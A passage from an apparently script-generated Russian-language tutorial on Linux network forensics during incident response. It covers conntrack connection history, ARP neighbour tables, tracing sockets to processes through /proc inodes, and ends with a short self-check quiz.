## Шаг 3: conntrack — история соединений

Если включён firewall с conntrack, он помнит **все** соединения, включая закрытые:

```
$ sudo conntrack -L | grep 203.0.113.5
tcp 6 431999 ESTABLISHED src=10.10.20.5 dst=203.0.113.5 sport=54322 dport=443 ...
```

Это уже история, а не только текущее состояние — ценный источник для таймлайна.

## Шаг 4: ARP-таблица

Кто был в локальной сети:

```
$ ip neigh show
10.10.20.9 dev eth0 lladdr 02:42:0a:0a:14:09 REACHABLE
```

MAC-адрес `02:42:...` — типичный для виртуальных интерфейсов (Docker/VM). Сопоставляя
MAC и IP, понимаешь топологию и возможный источник атаки.

## Шаг 5: сопоставляем с процессами

Ключевая связка: сокет → inode → процесс. Inode сокета:

```
$ ls -l /proc/991/fd/4
lrwx------ 1 root root 64 ... 4 -> socket:[45678]
```

Затем ищем этот inode по всем `/proc`:

```
$ for p in /proc/[0-9]*; do grep -l 45678 "$p"/fdinfo/* 2>/dev/null; done
```

Так находишь **все** процессы, использующие соединение.

## Что мы теперь знаем

- `ss -tunap` показывает соединения с процессами.
- `/proc/net/tcp` — сырые hex-адреса (полезно без утилит).
- conntrack помнит закрытые соединения — история.
- `ip neigh` даёт ARP/MAC — локальная топология.
- Сокет ↔ inode ↔ процесс связывает сеть с файлами и процессами.

## Если не сработало

- Соединение закрыто? Смотри conntrack и логи firewall.
- Нет conntrack? Проверь `/var/log/` и eBPF-трассировку.
- Нужен трафик? Снимай дамп (`tcpdump`) до выключения хоста.

## Квиз

Проверь себя.

```quiz
- question: Какая команда показывает соединения с процессами?
  options:
    - 'ls -la'
    - 'ss -tunap'
    - 'cat /etc/hosts'
    - 'free -h'
  answer: 1
  explanation: 'ss с -p связывает сокеты с процессами, -a показывает все.'
- question: Где хранятся сырые сетевые таблицы?
  options:
    - 'в /proc/net/tcp'
    - 'в /etc/passwd'
    - 'в /boot'
    - 'в /tmp'
  answer: 0
  explanation: '/proc/net/* содержит таблицы сокетов в hex.'
- question: Что даёт conntrack?
  options:
    - 'только текущие соединения'
    - 'историю соединений, включая закрытые'
    - 'пароли'
    - 'файлы'
  answer: 1
  explanation: 'conntrack ведёт таблицу состояний соединений — история трафика.'
- question: Как связать сокет с процессом?
  options:
    - 'по имени файла'
    - 'через inode сокета в /proc/<pid>/fd'
    - 'по MAC'
    - 'по дате'
  answer: 1
  explanation: 'Симлинк socket:[inode] связывает дескриптор и соединение.'
```
''')

emit(HUBS, LESSONS)
